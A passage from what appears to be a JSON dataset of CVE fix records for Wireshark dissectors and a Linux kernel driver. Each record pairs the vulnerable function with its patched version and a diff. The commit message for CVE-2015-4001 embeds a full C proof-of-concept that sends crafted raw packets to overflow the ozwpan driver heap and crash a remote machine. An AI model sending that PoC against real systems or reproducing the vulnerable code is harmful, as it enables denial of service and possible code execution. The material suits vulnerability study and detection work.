expert_add_info_format(pinfo, NULL, &ei_lbmr_analysis_invalid_value, \"Unknown LBMR PSER option 0x%02x\", opt_type);\n                    break;\n            }\n        }\n    }\n    return (len);\n}",
        "func": "static int dissect_lbmr_pser(tvbuff_t * tvb, int offset, packet_info * pinfo, proto_tree * tree)\n{\n    int hdr_len = 0;\n    int len = 0;\n    int topic_len = 0;\n    static const int * flags[] =\n    {\n        &hf_lbmr_pser_flags_option,\n        NULL\n    };\n    int curr_offset = offset;\n    guint16 flags_val = 0;\n\n    hdr_len = (int)tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_T_LEN);\n    flags_val = tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_T_FLAGS);\n    topic_len = hdr_len - L_LBMR_PSER_T;\n    proto_tree_add_item(tree, hf_lbmr_pser_dep_type, tvb, offset + O_LBMR_PSER_T_DEP_TYPE, L_LBMR_PSER_T_DEP_TYPE, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_len, tvb, offset + O_LBMR_PSER_T_LEN, L_LBMR_PSER_T_LEN, ENC_BIG_ENDIAN);\n    proto_tree_add_bitmask(tree, tvb, offset + O_LBMR_PSER_T_FLAGS, hf_lbmr_pser_flags, ett_lbmr_pser_flags, flags, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_source_ip, tvb, offset + O_LBMR_PSER_T_SOURCE_IP, L_LBMR_PSER_T_SOURCE_IP, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_store_ip, tvb, offset + O_LBMR_PSER_T_STORE_IP, L_LBMR_PSER_T_STORE_IP, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_transport_idx, tvb, offset + O_LBMR_PSER_T_TRANSPORT_IDX, L_LBMR_PSER_T_TRANSPORT_IDX, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_topic_idx, tvb, offset + O_LBMR_PSER_T_TOPIC_IDX, L_LBMR_PSER_T_TOPIC_IDX, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_source_port, tvb, offset + O_LBMR_PSER_T_SOURCE_PORT, L_LBMR_PSER_T_SOURCE_PORT, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_store_port, tvb, offset + O_LBMR_PSER_T_STORE_PORT, L_LBMR_PSER_T_STORE_PORT, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_topic, tvb, offset + O_LBMR_PSER_T_TOPIC, topic_len, ENC_ASCII|ENC_NA);\n    curr_offset += hdr_len;\n    len = hdr_len;\n    if ((flags_val & LBMR_PSER_OPT_FLAG) != 0)\n    {\n        proto_tree * opts_tree = NULL;\n        proto_item * opts_item = NULL;\n        proto_tree * optlen_tree = NULL;\n        proto_tree * optlen_item = NULL;\n        guint16 opt_len = 0;\n\n        opt_len = tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_OPTLEN);\n        opts_item = proto_tree_add_item(tree, hf_lbmr_pser_opts, tvb, curr_offset, -1, ENC_NA);\n        opts_tree = proto_item_add_subtree(opts_item, ett_lbmr_pser_opts);\n        optlen_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_optlen, tvb, curr_offset, L_LBMR_PSER_OPTLEN_T, ENC_NA);\n        optlen_tree = proto_item_add_subtree(optlen_item, ett_lbmr_pser_opt_len);\n        proto_tree_add_item(optlen_tree, hf_lbmr_pser_optlen_type, tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_TYPE, L_LBMR_PSER_OPTLEN_T_TYPE, ENC_BIG_ENDIAN);\n        proto_tree_add_item(optlen_tree, hf_lbmr_pser_optlen_optlen, tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_OPTLEN, L_LBMR_PSER_OPTLEN_T_OPTLEN, ENC_BIG_ENDIAN);\n        proto_item_set_len(opts_item, opt_len);\n        len += L_LBMR_PSER_OPTLEN_T;\n        curr_offset += L_LBMR_PSER_OPTLEN_T;\n        opt_len -= L_LBMR_PSER_OPTLEN_T;\n        while (opt_len > 0)\n        {\n            proto_tree * ctxinst_tree = NULL;\n            proto_item * ctxinst_item = NULL;\n            guint8 opt_type = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_TYPE);\n            guint8 option_len = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_LEN);\n\n            switch (opt_type)\n            {\n                case LBMR_PSER_OPT_SRC_CTXINST_TYPE:\n                case LBMR_PSER_OPT_STORE_CTXINST_TYPE:\n                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, curr_offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);\n                    ctxinst_tree = proto_item_add_subtree(ctxinst_item, ett_lbmr_pser_opt_ctxinst);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_len, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_LEN, L_LBMR_PSER_OPT_CTXINST_T_LEN, ENC_BIG_ENDIAN);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_type, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_TYPE, L_LBMR_PSER_OPT_CTXINST_T_TYPE, ENC_BIG_ENDIAN);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_ctxinst, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_CTXINST, L_LBMR_PSER_OPT_CTXINST_T_CTXINST, ENC_NA);\n                    len += L_LBMR_PSER_OPT_CTXINST_T;\n                    curr_offset += L_LBMR_PSER_OPT_CTXINST_T;\n                    opt_len -= L_LBMR_PSER_OPT_CTXINST_T;\n                    break;\n                default:\n                    len += option_len;\n                    curr_offset += option_len;\n                    opt_len -= option_len;\n                    expert_add_info_format(pinfo, NULL, &ei_lbmr_analysis_invalid_value, \"Unknown LBMR PSER option 0x%02x\", opt_type);\n                    if (option_len == 0) {\n                        return (len);\n                    }\n                    break;\n            }\n        }\n    }\n    return (len);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -50,13 +50,13 @@\n             proto_tree * ctxinst_tree = NULL;\n             proto_item * ctxinst_item = NULL;\n             guint8 opt_type = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_TYPE);\n-            guint8 option_len = tvb_get_guint8(tvb, O_LBMR_PSER_OPT_HDR_T_LEN);\n+            guint8 option_len = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_LEN);\n \n             switch (opt_type)\n             {\n                 case LBMR_PSER_OPT_SRC_CTXINST_TYPE:\n                 case LBMR_PSER_OPT_STORE_CTXINST_TYPE:\n-                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);\n+                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, curr_offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);\n                     ctxinst_tree = proto_item_add_subtree(ctxinst_item, ett_lbmr_pser_opt_ctxinst);\n                     proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_len, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_LEN, L_LBMR_PSER_OPT_CTXINST_T_LEN, ENC_BIG_ENDIAN);\n                     proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_type, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_TYPE, L_LBMR_PSER_OPT_CTXINST_T_TYPE, ENC_BIG_ENDIAN);\n@@ -70,6 +70,9 @@\n                     curr_offset += option_len;\n                     opt_len -= option_len;\n                     expert_add_info_format(pinfo, NULL, &ei_lbmr_analysis_invalid_value, \"Unknown LBMR PSER option 0x%02x\", opt_type);\n+                    if (option_len == 0) {\n+                        return (len);\n+                    }\n                     break;\n             }\n         }",
        "diff_line_info": {
            "deleted_lines": [
                "            guint8 option_len = tvb_get_guint8(tvb, O_LBMR_PSER_OPT_HDR_T_LEN);",
                "                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);"
            ],
            "added_lines": [
                "            guint8 option_len = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_LEN);",
                "                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, curr_offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);",
                "                    if (option_len == 0) {",
                "                        return (len);",
                "                    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3814",
        "func_name": "wireshark/dissect_tfs_request",
        "description": "The (1) dissect_tfs_request and (2) dissect_tfs_response functions in epan/dissectors/packet-ieee80211.c in the IEEE 802.11 dissector in Wireshark 1.10.x before 1.10.14 and 1.12.x before 1.12.5 interpret a zero value as a length rather than an error condition, which allows remote attackers to cause a denial of service (infinite loop) via a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/e243b0041328980a9bbd43bb8a8166d7422f9096",
        "commit_title": "[IEEE 802.11] fix two potential endless loops",
        "commit_text": " add_tagged_field() may return 0 if the tag length is not what is expected for this particular tag  Bug: 11110 ",
        "func_before": "static int dissect_tfs_request(packet_info *pinfo, proto_tree *tree,\n                               tvbuff_t *tvb, int offset, guint32 tag_len,\n                               int ftype)\n{\n  int end = offset + tag_len;\n\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_id,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  offset++;\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_ac_delete_after_match,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_ac_notify,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  offset++;\n  if (offset + 1 >= end) {\n    expert_add_info_format(pinfo, tree, &ei_ieee80211_missing_data,\n                           \"No TFS Request subelements in TFS Request\");\n    return end;\n  }\n\n  while (offset + 1 < end) {\n    guint8 id, len;\n    int s_offset, s_end;\n\n    id = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem_id,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    len = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem_len,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    if (offset + len > end) {\n      expert_add_info_format(pinfo, tree, &ei_ieee80211_tag_length,\n                             \"Not enough data for TFS Request subelement\");\n      return end;\n    }\n    switch (id) {\n    case TFS_REQ_SUBELEM_TFS:\n      s_offset = offset;\n      s_end = offset + len;\n      while (s_offset < s_end) {\n        int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n        s_offset += tlen;\n      }\n      break;\n    default:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem,\n                          tvb, offset, len, ENC_NA);\n      break;\n    }\n    offset += len;\n  }\n\n  if (offset < end) {\n    proto_tree_add_expert_format(tree, pinfo, &ei_ieee80211_extra_data,\n                           tvb, offset, end - offset, \"Extra data after TFS Subelements\");\n  }\n\n  return end;\n}",
        "func": "static int dissect_tfs_request(packet_info *pinfo, proto_tree *tree,\n                               tvbuff_t *tvb, int offset, guint32 tag_len,\n                               int ftype)\n{\n  int end = offset + tag_len;\n\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_id,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  offset++;\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_ac_delete_after_match,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_ac_notify,\n                      tvb, offset, 1, ENC_LITTLE_ENDIAN);\n  offset++;\n  if (offset + 1 >= end) {\n    expert_add_info_format(pinfo, tree, &ei_ieee80211_missing_data,\n                           \"No TFS Request subelements in TFS Request\");\n    return end;\n  }\n\n  while (offset + 1 < end) {\n    guint8 id, len;\n    int s_offset, s_end;\n\n    id = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem_id,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    len = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem_len,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    if (offset + len > end) {\n      expert_add_info_format(pinfo, tree, &ei_ieee80211_tag_length,\n                             \"Not enough data for TFS Request subelement\");\n      return end;\n    }\n    switch (id) {\n    case TFS_REQ_SUBELEM_TFS:\n      s_offset = offset;\n      s_end = offset + len;\n      while (s_offset < s_end) {\n        int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n        if (tlen==0)\n          break;\n        s_offset += tlen;\n      }\n      break;\n    default:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_request_subelem,\n                          tvb, offset, len, ENC_NA);\n      break;\n    }\n    offset += len;\n  }\n\n  if (offset < end) {\n    proto_tree_add_expert_format(tree, pinfo, &ei_ieee80211_extra_data,\n                           tvb, offset, end - offset, \"Extra data after TFS Subelements\");\n  }\n\n  return end;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -41,6 +41,8 @@\n       s_end = offset + len;\n       while (s_offset < s_end) {\n         int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n+        if (tlen==0)\n+          break;\n         s_offset += tlen;\n       }\n       break;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (tlen==0)",
                "          break;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3814",
        "func_name": "wireshark/dissect_tfs_response",
        "description": "The (1) dissect_tfs_request and (2) dissect_tfs_response functions in epan/dissectors/packet-ieee80211.c in the IEEE 802.11 dissector in Wireshark 1.10.x before 1.10.14 and 1.12.x before 1.12.5 interpret a zero value as a length rather than an error condition, which allows remote attackers to cause a denial of service (infinite loop) via a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/e243b0041328980a9bbd43bb8a8166d7422f9096",
        "commit_title": "[IEEE 802.11] fix two potential endless loops",
        "commit_text": " add_tagged_field() may return 0 if the tag length is not what is expected for this particular tag  Bug: 11110 ",
        "func_before": "static int dissect_tfs_response(packet_info *pinfo, proto_tree *tree,\n                                tvbuff_t *tvb, int offset, guint32 tag_len,\n                                int ftype)\n{\n  int end = offset + tag_len;\n\n  while (offset + 3 <= end) {\n    guint8 id, len;\n    int s_offset, s_end;\n\n    id = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem_id,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    len = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem_len,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    if (offset + len > end) {\n      expert_add_info_format(pinfo, tree, &ei_ieee80211_tag_length,\n                             \"Not enough data for TFS Request subelement\");\n      return end;\n    }\n    switch (id) {\n    case TFS_RESP_SUBELEM_TFS_STATUS:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_status,\n                          tvb, offset, 1, ENC_LITTLE_ENDIAN);\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_id,\n                          tvb, offset + 1, 1, ENC_LITTLE_ENDIAN);\n      break;\n    case TFS_RESP_SUBELEM_TFS:\n      s_offset = offset;\n      s_end = offset + len;\n      while (s_offset < s_end) {\n        int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n        s_offset += tlen;\n      }\n      break;\n    default:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem,\n                          tvb, offset, len, ENC_NA);\n      break;\n    }\n\n    offset += len;\n  }\n\n  if (offset < end) {\n    proto_tree_add_expert_format(tree, pinfo, &ei_ieee80211_extra_data,\n                           tvb, offset, end - offset, \"Extra data after TFS Subelements\");\n  }\n\n  return end;\n}",
        "func": "static int dissect_tfs_response(packet_info *pinfo, proto_tree *tree,\n                                tvbuff_t *tvb, int offset, guint32 tag_len,\n                                int ftype)\n{\n  int end = offset + tag_len;\n\n  while (offset + 3 <= end) {\n    guint8 id, len;\n    int s_offset, s_end;\n\n    id = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem_id,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    len = tvb_get_guint8(tvb, offset);\n    proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem_len,\n                        tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset++;\n    if (offset + len > end) {\n      expert_add_info_format(pinfo, tree, &ei_ieee80211_tag_length,\n                             \"Not enough data for TFS Request subelement\");\n      return end;\n    }\n    switch (id) {\n    case TFS_RESP_SUBELEM_TFS_STATUS:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_status,\n                          tvb, offset, 1, ENC_LITTLE_ENDIAN);\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_id,\n                          tvb, offset + 1, 1, ENC_LITTLE_ENDIAN);\n      break;\n    case TFS_RESP_SUBELEM_TFS:\n      s_offset = offset;\n      s_end = offset + len;\n      while (s_offset < s_end) {\n        int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n        if (tlen==0)\n          break;\n        s_offset += tlen;\n      }\n      break;\n    default:\n      proto_tree_add_item(tree, hf_ieee80211_tag_tfs_response_subelem,\n                          tvb, offset, len, ENC_NA);\n      break;\n    }\n\n    offset += len;\n  }\n\n  if (offset < end) {\n    proto_tree_add_expert_format(tree, pinfo, &ei_ieee80211_extra_data,\n                           tvb, offset, end - offset, \"Extra data after TFS Subelements\");\n  }\n\n  return end;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -33,6 +33,8 @@\n       s_end = offset + len;\n       while (s_offset < s_end) {\n         int tlen = add_tagged_field(pinfo, tree, tvb, s_offset, ftype);\n+        if (tlen==0)\n+          break;\n         s_offset += tlen;\n       }\n       break;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (tlen==0)",
                "          break;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4001",
        "func_name": "torvalds/linux/oz_hcd_get_desc_cnf",
        "description": "Integer signedness error in the oz_hcd_get_desc_cnf function in drivers/staging/ozwpan/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.",
        "git_url": "https://github.com/torvalds/linux/commit/b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c",
        "commit_title": "ozwpan: Use unsigned ints to prevent heap overflow",
        "commit_text": " Using signed integers, the subtraction between required_size and offset could wind up being negative, resulting in a memcpy into a heap buffer with a negative length, resulting in huge amounts of network-supplied data being copied into the heap, which could potentially lead to remote code execution.. This is remotely triggerable with a magic packet. A PoC which obtains DoS follows below. It requires the ozprotocol.h file from this module.  =-=-=-=-=-=   #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>   #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include \"ozprotocol.h\"  static int hex2num(char c) { \tif (c >= '0' && c <= '9') \t\treturn c - '0'; \tif (c >= 'a' && c <= 'f') \t\treturn c - 'a' + 10; \tif (c >= 'A' && c <= 'F') \t\treturn c - 'A' + 10; \treturn -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { \tint i; \tfor (i = 0; i < 6; i++) { \t\tint a, b; \t\ta = hex2num(*txt++); \t\tif (a < 0) \t\t\treturn -1; \t\tb = hex2num(*txt++); \t\tif (b < 0) \t\t\treturn -1; \t\t*addr++ = (a << 4) | b; \t\tif (i < 5 && *txt++ != ':') \t\t\treturn -1; \t} \treturn 0; }  int main(int argc, char *argv[]) { \tif (argc < 3) { \t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); \t\treturn 1; \t}  \tuint8_t dest_mac[6]; \tif (hwaddr_aton(argv[2], dest_mac)) { \t\tfprintf(stderr, \"Invalid mac address.\\n\"); \t\treturn 1; \t}  \tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); \tif (sockfd < 0) { \t\tperror(\"socket\"); \t\treturn 1; \t}  \tstruct ifreq if_idx; \tint interface_index; \tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); \tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { \t\tperror(\"SIOCGIFINDEX\"); \t\treturn 1; \t} \tinterface_index = if_idx.ifr_ifindex; \tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { \t\tperror(\"SIOCGIFHWADDR\"); \t\treturn 1; \t} \tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;  \tstruct { \t\tstruct ether_header ether_header; \t\tstruct oz_hdr oz_hdr; \t\tstruct oz_elt oz_elt; \t\tstruct oz_elt_connect_req oz_elt_connect_req; \t} __packed connect_packet = { \t\t.ether_header = { \t\t\t.ether_type = htons(OZ_ETHERTYPE), \t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, \t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } \t\t}, \t\t.oz_hdr = { \t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), \t\t\t.last_pkt_num = 0, \t\t\t.pkt_num = htole32(0) \t\t}, \t\t.oz_elt = { \t\t\t.type = OZ_ELT_CONNECT_REQ, \t\t\t.length = sizeof(struct oz_elt_connect_req) \t\t}, \t\t.oz_elt_connect_req = { \t\t\t.mode = 0, \t\t\t.resv1 = {0}, \t\t\t.pd_info = 0, \t\t\t.session_id = 0, \t\t\t.presleep = 35, \t\t\t.ms_isoc_latency = 0, \t\t\t.host_vendor = 0, \t\t\t.keep_alive = 0, \t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1), \t\t\t.max_len_div16 = 0, \t\t\t.ms_per_isoc = 0, \t\t\t.up_audio_buf = 0, \t\t\t.ms_per_elt = 0 \t\t} \t};  \tstruct { \t\tstruct ether_header ether_header; \t\tstruct oz_hdr oz_hdr; \t\tstruct oz_elt oz_elt; \t\tstruct oz_get_desc_rsp oz_get_desc_rsp; \t} __packed pwn_packet = { \t\t.ether_header = { \t\t\t.ether_type = htons(OZ_ETHERTYPE), \t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, \t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } \t\t}, \t\t.oz_hdr = { \t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), \t\t\t.last_pkt_num = 0, \t\t\t.pkt_num = htole32(1) \t\t}, \t\t.oz_elt = { \t\t\t.type = OZ_ELT_APP_DATA, \t\t\t.length = sizeof(struct oz_get_desc_rsp) \t\t}, \t\t.oz_get_desc_rsp = { \t\t\t.app_id = OZ_APPID_USB, \t\t\t.elt_seq_num = 0, \t\t\t.type = OZ_GET_DESC_RSP, \t\t\t.req_id = 0, \t\t\t.offset = htole16(2), \t\t\t.total_size = htole16(1), \t\t\t.rcode = 0, \t\t\t.data = {0} \t\t} \t};  \tstruct sockaddr_ll socket_address = { \t\t.sll_ifindex = interface_index, \t\t.sll_halen = ETH_ALEN, \t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } \t};  \tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { \t\tperror(\"sendto\"); \t\treturn 1; \t} \tusleep(300000); \tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { \t\tperror(\"sendto\"); \t\treturn 1; \t} \treturn 0; }  Cc: stable <stable@vger.kernel.org>",
        "func_before": "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\n\t\t\tint length, int offset, int total_size)\n{\n\tstruct oz_port *port = hport;\n\tstruct urb *urb;\n\tint err = 0;\n\n\toz_dbg(ON, \"oz_hcd_get_desc_cnf length = %d offs = %d tot_size = %d\\n\",\n\t       length, offset, total_size);\n\turb = oz_find_urb_by_id(port, 0, req_id);\n\tif (!urb)\n\t\treturn;\n\tif (status == 0) {\n\t\tint copy_len;\n\t\tint required_size = urb->transfer_buffer_length;\n\n\t\tif (required_size > total_size)\n\t\t\trequired_size = total_size;\n\t\tcopy_len = required_size-offset;\n\t\tif (length <= copy_len)\n\t\t\tcopy_len = length;\n\t\tmemcpy(urb->transfer_buffer+offset, desc, copy_len);\n\t\toffset += copy_len;\n\t\tif (offset < required_size) {\n\t\t\tstruct usb_ctrlrequest *setup =\n\t\t\t\t(struct usb_ctrlrequest *)urb->setup_packet;\n\t\t\tunsigned wvalue = le16_to_cpu(setup->wValue);\n\n\t\t\tif (oz_enqueue_ep_urb(port, 0, 0, urb, req_id))\n\t\t\t\terr = -ENOMEM;\n\t\t\telse if (oz_usb_get_desc_req(port->hpd, req_id,\n\t\t\t\t\tsetup->bRequestType, (u8)(wvalue>>8),\n\t\t\t\t\t(u8)wvalue, setup->wIndex, offset,\n\t\t\t\t\trequired_size-offset)) {\n\t\t\t\toz_dequeue_ep_urb(port, 0, 0, urb);\n\t\t\t\terr = -ENOMEM;\n\t\t\t}\n\t\t\tif (err == 0)\n\t\t\t\treturn;\n\t\t}\n\t}\n\turb->actual_length = total_size;\n\toz_complete_urb(port->ozhcd->hcd, urb, 0);\n}",
        "func": "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,\n\t\t\tu8 length, u16 offset, u16 total_size)\n{\n\tstruct oz_port *port = hport;\n\tstruct urb *urb;\n\tint err = 0;\n\n\toz_dbg(ON, \"oz_hcd_get_desc_cnf length = %d offs = %d tot_size = %d\\n\",\n\t       length, offset, total_size);\n\turb = oz_find_urb_by_id(port, 0, req_id);\n\tif (!urb)\n\t\treturn;\n\tif (status == 0) {\n\t\tunsigned int copy_len;\n\t\tunsigned int required_size = urb->transfer_buffer_length;\n\n\t\tif (required_size > total_size)\n\t\t\trequired_size = total_size;\n\t\tcopy_len = required_size-offset;\n\t\tif (length <= copy_len)\n\t\t\tcopy_len = length;\n\t\tmemcpy(urb->transfer_buffer+offset, desc, copy_len);\n\t\toffset += copy_len;\n\t\tif (offset < required_size) {\n\t\t\tstruct usb_ctrlrequest *setup =\n\t\t\t\t(struct usb_ctrlrequest *)urb->setup_packet;\n\t\t\tunsigned wvalue = le16_to_cpu(setup->wValue);\n\n\t\t\tif (oz_enqueue_ep_urb(port, 0, 0, urb, req_id))\n\t\t\t\terr = -ENOMEM;\n\t\t\telse if (oz_usb_get_desc_req(port->hpd, req_id,\n\t\t\t\t\tsetup->bRequestType, (u8)(wvalue>>8),\n\t\t\t\t\t(u8)wvalue, setup->wIndex, offset,\n\t\t\t\t\trequired_size-offset)) {\n\t\t\t\toz_dequeue_ep_urb(port, 0, 0, urb);\n\t\t\t\terr = -ENOMEM;\n\t\t\t}\n\t\t\tif (err == 0)\n\t\t\t\treturn;\n\t\t}\n\t}\n\turb->actual_length = total_size;\n\toz_complete_urb(port->ozhcd->hcd, urb, 0);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,5 +1,5 @@\n-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\n-\t\t\tint length, int offset, int total_size)\n+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,\n+\t\t\tu8 length, u16 offset, u16 total_size)\n {\n \tstruct oz_port *port = hport;\n \tstruct urb *urb;\n@@ -11,8 +11,8 @@\n \tif (!urb)\n \t\treturn;\n \tif (status == 0) {\n-\t\tint copy_len;\n-\t\tint required_size = urb->transfer_buffer_length;\n+\t\tunsigned int copy_len;\n+\t\tunsigned int required_size = urb->transfer_buffer_length;\n \n \t\tif (required_size > total_size)\n \t\t\trequired_size = total_size;",
        "diff_line_info": {
            "deleted_lines": [
                "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,",
                "\t\t\tint length, int offset, int total_size)",
                "\t\tint copy_len;",
                "\t\tint required_size = urb->transfer_buffer_length;"
            ],
            "added_lines": [
                "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,",
                "\t\t\tu8 length, u16 offset, u16 total_size)",
                "\t\tunsigned int copy_len;",
                "\t\tunsigned int required_size = urb->transfer_buffer_length;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4003",
        "func_name": "torvalds/linux/oz_usb_handle_ep_data",
